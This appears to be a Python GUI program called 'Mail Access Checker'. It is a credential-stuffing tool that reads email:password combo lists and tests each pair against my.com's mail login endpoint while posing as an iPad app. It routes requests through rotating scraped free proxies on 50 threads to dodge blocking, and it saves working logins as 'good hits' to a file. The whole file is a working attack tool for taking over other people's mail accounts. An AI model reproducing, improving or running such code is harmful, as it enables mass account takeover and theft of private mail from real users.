import random
import requests
from requests import Session
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import PySimpleGUI as sg
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import datetime

x = datetime.datetime.now()

session = Session()

combos = ""

good = 0
bad = 0
errors = 0

completed = 0


def get_proxyiess():
    url = "https://www.sslproxies.org/"
    r = session.get(url).content
    soup = BeautifulSoup(r, "html.parser")
    all_proxies = list(map(lambda x: x[0] + ":" + x[1], list(
        zip(map(lambda x: x.text, soup.findAll('td')[0::8]), map(lambda x: x.text, soup.findAll('td')[1::8])))))
    window['ProxyCount'].update(str(len(all_proxies)))
    return {"https": random.choice(all_proxies)}


def proxy_request(req_type, url, **kwargs):
    while 1:
        try:

            proxy = get_proxyiess()

            r = session.request(req_type, url, proxies=proxy, timeout=5, **kwargs).text
            break
        except Exception as e:
            global errors
            errors += 1
            window['ProxyErrors'].update(str(errors))
            pass
    return r


def checker(email, password):
    global completed
    url = f"https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&"
    r = proxy_request("get", url)

    if '["AjaxResponse", "OK", "Ok=0"]' in r:
        global bad

        completed += 1
        bad += 1
        window['Completed'].update(str(completed))
        window['BadHit'].update(str(bad))

    elif "form_sign_sentmsg" in r:
        global good

        good += 1
        completed += 1
        window['Completed'].update(str(completed))
        window["Hits_Results"].print(f"{email}:{password}")
        window['GoodHit'].update(str(good))
        open(f"Results\\[Good Hits] {x.strftime('%d-%m-%y %I-%M-%S-%p')}.txt", "a", encoding="utf-8").write(
            f"{email}:{password}\n")


def run1():
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(checker, combo.split(":")[0], combo.split(":")[1]) for combo in combos]
        executor.shutdown(wait=True)


theme_name_list = sg.theme_list()
sg.theme("darkblue2")
Layout = [[sg.Image(filename="icons/logo.png", size=(50, 50)), sg.Text("Mail Access Checker", font=("", 25))],
          [sg.Text("Developed By Henry Richard J", font=("", 13))],
          [sg.Multiline(size=(65, 25), disabled=True, key="Hits_Results")],
          [sg.Text("Good", font=("", 12)),
           sg.Text("0", font=("", 12), text_color="lightgreen", key="GoodHit", size=(10, 0)),
           sg.Text("Bad", font=("", 12)), sg.Text("0", font=("", 12), text_color="red", key="BadHit", size=(10, 0))],
          [sg.Text("Total Combo", font=("", 12)),
           sg.Text("0", font=("", 12), text_color="yellow", key="ComboCount", size=(10, 0)),
           sg.Text("Total Proxy", font=("", 12)),
           sg.Text("0", font=("", 12), text_color="orange", key="ProxyCount", size=(10, 0))],
          [sg.Text("Total Checked", font=("", 12)),
           sg.Text("0", font=("", 12), text_color="cyan", key="Completed", size=(10, 0)),
           sg.Text("Proxy Error", font=("", 12)),
           sg.Text("0", font=("", 12), text_color="LemonChiffon3", size=(10, 0), key="ProxyErrors")],
          [sg.FileBrowse("Load Combos", key="Load_Combos", size=(20, 2), font=("", 15),
                         file_types=(("Text Files", "*.txt"),)),
           sg.Button("Start", key="Start_Checking", size=(20, 2), font=("", 15))]]
window = sg.Window('Mail Access Checker', Layout, element_justification='center')
while True:
    event, values = window.read()
    if event == sg.WIN_CLOSED:
        break

    if event == "Start_Checking":
        combos = open(values['Load_Combos'], "r").read().split("\n")
        window["ComboCount"].update(str(len(combos)))
        Thread(target=run1, daemon=True).start()
